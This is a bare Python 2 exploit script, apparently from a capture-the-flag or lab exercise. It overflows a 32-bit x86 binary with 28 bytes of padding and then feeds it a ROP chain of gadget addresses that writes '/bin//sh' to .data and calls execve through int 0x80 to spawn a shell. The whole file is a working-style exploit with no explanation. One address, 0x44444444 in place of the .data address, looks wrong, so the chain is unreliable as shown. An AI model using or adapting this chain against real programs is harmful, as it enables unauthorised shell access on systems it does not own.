#!/usr/bin/env python2
from struct import pack


p = 'A'*28
#p += pack('<L', 0x80481b2)
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x44444444)  # @ .data
p += pack('<I', 0x080a8e36)  # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da064)  # @ .data + 4
p += pack('<I', 0x080a8e36)  # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x08056420)  # xor eax, eax ; ret
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9)  # pop ebx ; ret
p += pack('<I', 0x080da060)  # @ .data
p += pack('<I', 0x0806ee92)  # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x080da060)  # padding without overwrite ebx
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x08056420)  # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x08049563)  # int 0x80
print(p)
